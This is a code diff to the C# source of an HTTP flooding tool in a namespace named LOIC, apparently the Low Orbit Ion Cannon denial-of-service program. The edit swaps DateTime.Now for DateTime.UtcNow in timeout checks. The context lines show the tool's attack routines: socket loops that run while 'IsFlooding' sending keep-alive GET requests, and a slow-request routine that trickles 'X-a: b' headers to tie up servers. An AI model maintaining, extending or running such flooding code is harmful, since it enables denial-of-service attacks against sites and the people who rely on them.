@@ -172,16 +172,16 @@ namespace LOIC
                 byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                 byte[] rbuf = new byte[bsize];
                 State = ReqState.Ready;
-                var stop = DateTime.Now;
+                var stop = DateTime.UtcNow;
 
                 string redirect = "";
                 while (IsFlooding)
                 {
-                    stop = DateTime.Now.AddMilliseconds(Timeout);
+                    stop = DateTime.UtcNow.AddMilliseconds(Timeout);
                     State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
                     // forget about slow! .. we have enough saveguards in place!
-                    while (IsDelayed && (DateTime.Now < stop))
+                    while (IsDelayed && (DateTime.UtcNow < stop))
                     {
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         socket.ReceiveBufferSize = bsize;
@@ -255,7 +255,7 @@ namespace LOIC
                                     }
                                     catch
                                     { }
-                                } while ((redirect != "") && (DateTime.Now < stop));
+                                } while ((redirect != "") && (DateTime.UtcNow < stop));
 
                                 if (!keeps)
                                     Failed++;
@@ -409,15 +409,15 @@ namespace LOIC
                 byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                 byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
                 State = ReqState.Ready;
-                var stop = DateTime.Now;
+                var stop = DateTime.UtcNow;
 
                 while (IsFlooding)
                 {
-                    stop = DateTime.Now.AddMilliseconds(Timeout);
+                    stop = DateTime.UtcNow.AddMilliseconds(Timeout);
                     State = ReqState.Connecting; // SET STATE TO CONNECTING //
 
                     // we have to do this really slow 
-                    while (IsDelayed && (DateTime.Now < stop))
+                    while (IsDelayed && (DateTime.UtcNow < stop))
                     {
                         if (_random == true)
                         {
